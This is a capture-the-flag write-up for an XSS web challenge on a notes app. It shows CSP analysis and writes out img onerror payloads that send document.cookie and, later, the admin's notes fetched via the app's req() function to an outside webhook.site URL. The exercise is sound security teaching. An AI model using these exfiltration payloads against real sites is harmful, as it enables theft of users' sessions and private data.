# Take Note of This [972 Points] - 13 Solves

```
After getting three quotes and totally not picking the lowest, we found that the application delivered to us has some...critical flaws. However, we were assured that there is no way for a malicious actor to read or exfiltrate the flag that the admin stored in a note.

In other completely unrelated news, come try out our application! For a short time, you can share your amazing notes with the admin.
http://chals.ctf.sg:30101/login
```

## 

## Initial Analysis

Visiting the site, we are greeted with a login page:

![](1.jpg)

There is no need to try and break it as we can easily register an account and take a look at what's inside.

Looking at the inside, we see a page where we can "Add a note". Adding a note also reveals a `Share` option, as well as the link to view the note you just added

![](2.jpg)

Let's take a look at the front-end Javascript to figure out what is going on. I quickly found a `main.js` in the page source and downloaded it to have a better look:

We will immediately notice something interesting in the following code:

```javascript
const share = document.createElement("span");
      share.className = "share";
      share.innerText = "Share";
      share.title = "Share your fabulous note with the admins";
      share.addEventListener("click", () => {
        display("");
        req(`/api/share/${i}`, "POST").then((data) => { //use this endpoint
          if (data.success) {
            display("Note shared!", "primary");
          } else {
            display("An error occured...", "danger");
          }
        });
      });
```

This suggests that it is **most likely an XSS challenge** since we are able to "share something with the admin".



## Achieving XSS

Let's first look for a place where we can launch an XSS attack.  

Looking around, we quickly realised that `loadNote()` is vulnerable to XSS since it sets the contents of the note via `innerHTML`:

```javascript
function loadNote() {
  const noteId = /^\/note\/([0-9]+)$/.exec(document.location.pathname)[1]; //gets id from address (e.g 3 from /note/3)
  req(`/api/note/${noteId}`, "GET").then((data) => {
    if (data.success) {
      document.querySelector("#note-id").innerHTML = noteId;
      document.querySelector("#note").innerHTML = data.note;
    }
  });
}
```

However, if we try the payload `<script>alert(1)</script>`, it will **not trigger**. 

This is most likely as the site has a **Content-Security Policy (CSP) set**, and we can find it in the HTTP headers:

```
Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self' 'unsafe-inline'
```

- `script-src 'self'` blocks any **scripts** that are **not from the origin**
- `default-src 'self'` blocks any content from **external sources** (i.e, no `fetch` from a different domain)
- `object-src 'none'` blocks Flash player etc.
- However, what is interesting is the `unsafe-inline` option

We can use Google's [CSP Evaluator](https://csp-evaluator.withgoogle.com/) to quickly check the CSP of a site, and sure enough, Google screams back at us over `unsafe-inline`:

![](3.jpg)

We can quickly find an inline XSS payload from the internet, such as this 1:

```html
<img src=1 onerror="alert(1)"></img>
```

And sure enough, it worked on the challenge site.

Next up, we have to somehow get information off the site, which is a challenge since `default-src` is set to `self`, which prevents us from making requests to our server. Thankfully, as I wrote in [DiceGang Babier CSP](https://github.com/IRS-Cybersec/ctfdump/tree/master/DiceGang%202021/web-Babier%20CSP) (another XSS challenge), we can overcome this using `location.href` to redirect the user along with their cookies.

Hence our payload now is:

```html
<img src=1 onerror="location.href='https://webhook.site/0c126fae-0187-4050-add1-4269dae9e427?data='+document.cookie"></img>
```

And nowww.... wait, there's nothing?

Trying it on my self, I can see that the request is made, but there didn't seem to be any data in it. A bit of googling revealed that the `cookies` were most likely **`httpOnly`**, which **prevents Javascript from accessing them**.

```
Set-Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoid2FkZGxlMiIsImlhdCI6MTYxNTcxNTgzNX0.ZdbhmD-1vPlILo8WhckPV4dd5-aoesrROxN-k59U0Bw; Path=/; HttpOnly
```

*Oh, No!*

Thankfully, our goal isn't to obtain the admin cookies, but to get the admin notes. We can do this by using `req()` (just like in the source code) to make a request on the admin's behalf along with their cookies to `/api/notes`, before sending it to our site. Hence our payload is:

```html
<img src=1 onerror="req(`/api/notes`, 'GET').then((data) => {location.href='https://webhook.site/0c126fae-0187-4050-add1-4269dae9e427?data='+encodeURIComponent(data.notes)})"></img>
```

<u>**Note:**</u> Due to the way the challenge was deployed, using an absolute path will not work. Thankfully, the organisers quickly debugged this for me.

And we obtain the flag:

```
CTFSG{g3nEr1c_aPp}
```





------

## Learning Points

- Bypassing CSP `default-src` using `location.href`
- `httpOnly` cookies can still be used by using `req()` instead of `fetch()`